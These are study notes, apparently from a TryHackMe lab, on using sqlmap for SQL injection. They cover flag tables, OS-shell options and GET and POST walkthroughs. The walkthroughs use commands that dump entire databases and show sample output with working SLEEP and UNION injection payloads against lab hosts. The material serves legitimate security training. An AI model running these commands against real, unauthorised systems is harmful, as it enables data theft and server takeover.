# Sqlmap

**sqlmap** is an open-source penetration testing tool that automates detecting and exploiting SQL injection flaws and taking over the underlying database server.

---

**Table of contents**

- [What sqlmap does](#what-sqlmap-does)
- [Basic command flags](#basic-command-flags)
- [Enumeration flags](#enumeration-flags)
- [Operating system access flags](#operating-system-access-flags)
- [GET-based target: full walkthrough](#get-based-target-full-walkthrough)
- [POST-based target: full walkthrough](#post-based-target-full-walkthrough)
- [In plain English](#in-plain-english)

---

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> sqlmap was built by Bernardo Damele Assumpção Guimarães and Miroslav Stampar. It covers the whole SQLi kill chain in one tool: detect the injection → fingerprint the DBMS → enumerate databases/tables/columns/data → (optionally) read files or get a shell on the underlying OS via out-of-band connections.
</div>

## What sqlmap does

sqlmap replaces a lot of the manual SQLi work covered in the [TryHackMe SQL Injection Lab](./SQL-Injection-Lab.md) and the [PortSwigger SQLi notes](../../../Web-Security-Academy/SQL-Injection/) — instead of hand-crafting `UNION SELECT` payloads and boolean/time-based probes one at a time, sqlmap automates the detection engine and the enumeration that follows it.

Run `sqlmap -h` for the basic help menu, `sqlmap -hh` for the full advanced option list.

## Basic command flags

| Flag | Purpose |
| --- | --- |
| `-u URL` | Target URL for a GET-based test (e.g. `http://site.com/page.php?id=1`) |
| `-r FILE` | Read a saved raw HTTP request from a file (used for POST-based tests) |
| `--data=DATA` | Data string to send via POST (e.g. `id=1`) instead of `-r` |
| `-p PARAM` | The specific parameter to test (otherwise sqlmap tries to guess which ones look testable) |
| `--random-agent` | Use a random `User-Agent` header (basic WAF/logging evasion) |
| `--level=LEVEL` | Depth of tests to run, 1–5 (default 1) — higher levels try more injection points and payload variations |
| `--risk=RISK` | How risky/intrusive the payloads can be, 1–3 (default 1) — higher risk includes payloads that could be destructive (e.g. heavier `OR` conditions) |
| `--technique=TECH` | Which SQLi technique classes to use (default `BEUSTQ` = Boolean/Error/Union/Stacked/Time/Inline-Query) |
| `--dbms=DBMS` | Skip fingerprinting and force a specific back-end DBMS |

## Enumeration flags

Used once sqlmap has confirmed the injection, to pull structure and data out of the database.

| Flag | Purpose |
| --- | --- |
| `-a`, `--all` | Retrieve everything sqlmap can |
| `-b`, `--banner` | Retrieve the DBMS banner (version string) |
| `--current-user` | Retrieve the current DBMS user |
| `--current-db` | Retrieve the current database name |
| `--passwords` | Enumerate DBMS user password hashes |
| `--dbs` | Enumerate all databases |
| `--tables` | Enumerate tables in a database |
| `--columns` | Enumerate columns in a table |
| `--schema` | Enumerate the full DB schema |
| `--dump` | Dump the rows of a specific table |
| `--dump-all` | Dump every table in every database |
| `--is-dba` | Check if the current user has DBA (admin) privileges |
| `-D NAME` | Database to target |
| `-T NAME` | Table to target |
| `-C NAME` | Column(s) to target |

## Operating system access flags

Used to go beyond the database and reach the host OS underneath it — only possible when the DBMS user has enough privileges (e.g. `FILE` priv in MySQL, `xp_cmdshell` in MSSQL).

| Flag | Purpose |
| --- | --- |
| `--os-shell` | Prompt for an interactive OS shell on the back-end server |
| `--os-pwn` | Prompt for an out-of-band shell, Meterpreter, or VNC session |
| `--os-cmd=CMD` | Run a single OS command |
| `--priv-esc` | Attempt privilege escalation of the DB process user |
| `--os-smbrelay` | One-click OOB shell/Meterpreter/VNC via an SMB relay |

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> OS access requires the database account sqlmap is injecting through to have elevated privileges on the DBMS itself. A low-privilege web-app DB user will not get you a shell just because the injection works.
</div>

## GET-based target: full walkthrough

For a parameter sitting directly in the URL:

```bash
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```

`-u` gives the vulnerable URL, `--dbs` enumerates the databases. Chain further flags onto the same base command to go deeper:

```bash
# list tables in a database
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables

# list columns in a table
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns

# dump everything
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```

## POST-based target: full walkthrough

POST parameters aren't in the URL, so sqlmap needs the raw request instead.

**1. Capture and save the request.** In Burp (or the browser), find the POST request carrying the suspect parameter, right-click → "Copy to file" (or copy the raw request into a text file), e.g. `req.txt`:

```http
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.17.116
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
Connection: close

blood_group=B%2B
```

Here `blood_group` is the parameter under suspicion.

**2. Point sqlmap at the saved request:**

```bash
sqlmap -r req.txt -p blood_group --dbs
```

`-r` reads the saved request file, `-p` tells sqlmap exactly which parameter to test, `--dbs` enumerates the databases.

sqlmap works through its detection engine against that parameter and reports back what it found:

```text
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(...)-- -
```

It confirms the injection with **two independent techniques** here (time-based blind + UNION), fingerprints the stack (MySQL / Linux Ubuntu / Nginx), and lists the databases.

sqlmap **caches the session** (injection point, DBMS, etc.) to disk, so every follow-up command against the same target/request resumes instantly instead of re-running detection from scratch — notice the log says *"resuming back-end DBMS 'mysql'"* and *"resumed the following injection point(s) from stored session"* on the next two commands:

```bash
# list tables in a database
sqlmap -r req.txt -D blood -T blood_db --columns

# dump every database and table in one shot
sqlmap -r req.txt -D blood --dump-all
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> <code>--flush-session</code> clears that cached session if you need sqlmap to re-detect from scratch (e.g. the app changed, or a previous run got a false result).
</div>

## In plain English

- **sqlmap** is a tool that does the tedious part of SQL injection for you: trying lots of payload variations to confirm the bug exists, figuring out what database software is running, and then pulling out database/table/column names and the actual data — all through flags instead of hand-typed payloads.
- **GET-based** means the vulnerable value is sitting right in the URL (`?id=7`); you just give sqlmap the URL.
- **POST-based** means the vulnerable value is submitted in a form body, not the URL, so you first have to capture that exact request (e.g. in Burp) and save it to a file, then point sqlmap at the file with `-r`.
- **DBMS** = Database Management System, i.e. the database software itself (MySQL, PostgreSQL, MSSQL, etc.) — not the same thing as "the database" (a named collection of tables inside it).
- **Session caching**: sqlmap remembers what it already figured out about a target so you don't have to re-detect the injection every time you want one more piece of data.
- **OS access** flags (`--os-shell`, `--os-pwn`) are the "end of the chain" — turning a SQL injection into a full command shell on the server — but only work if the database account itself has the privileges to do that on the OS.

---

*Room: TryHackMe — "Sqlmap". Tasks 1–2 covered (introduction + command reference and usage). Challenge task not yet pasted.*
